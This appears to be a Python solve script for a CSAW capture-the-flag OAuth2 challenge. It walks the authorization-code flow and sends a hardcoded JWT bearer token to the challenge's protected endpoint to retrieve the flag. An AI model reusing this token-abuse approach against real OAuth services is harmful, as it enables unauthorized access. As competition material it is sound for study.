#python3

import requests
import json
from urllib.parse import urlencode, quote_plus
import webbrowser

url_base = "http://web.chal.csaw.io:9000/"
token_url = url_base + "oauth2/token"
authorize_url = url_base + "oauth2/authorize"

headers = {'Content-Type': 'application/x-www-form-urlencoded'}#, "Authorization" : "Bearer {0}".format(token)}

redirect_uri = "https://www.google.com"
#"https://liyun-li.net"
"""
data = {"response_type":"code", "redirect_uri":redirect_uri, "scope":"openid"}
body = urlencode(data, quote_via=quote_plus)

request = requests.post(authorize_url,headers=headers,data=body)

print(request.text)
"""
"""
code = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjbGllbnRfaWQiOiJ4eHgiLCJyZWRpcmVjdF91cmkiOiJodHRwczovL2xpeXVuLWxpLm5ldCIsImlhdCI6MTUzNjk2NjU1NiwiZXhwIjoxNTM2OTY3MTU2fQ.XIHbzeLQ1oOGOwqhazwucg2z6PvdkXwzn6IAIg50s3M"

data = {"grant_type":'authorization_code', 'code': code, 'redirect_uri': redirect_uri, 'response_type': 'code', 'client-id': 'xxx'}
body = urlencode(data, quote_via=quote_plus)

request = requests.post(token_url,headers=headers,data=body)
print(request.text)

"""
#webbrowser.open(authorize_url+ '?request_token='+ code + '&redirect_uri=' + redirect_uri)
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoidXNlciIsInNlY3JldCI6InVmb3VuZG1lISIsImlhdCI6MTUzNjk2NzMyMywiZXhwIjoxNTM2OTY3OTIzfQ.qCZmN4qBR2kjlTkiZNdGE7Nuw9r-6ftx977451DcqlU"
headers = {'Content-Type': 'application/x-www-form-urlencoded', "Authorization" : "Bearer {0}".format(token), 'verify':'false'}

def get_flag():
        url = "{0}protected".format(url_base)
        response = requests.get(url, headers=headers)

        if response.status_code == 200:
            return json.loads(response.content.decode("utf-8"))
        else:
            return response.text


print(get_flag())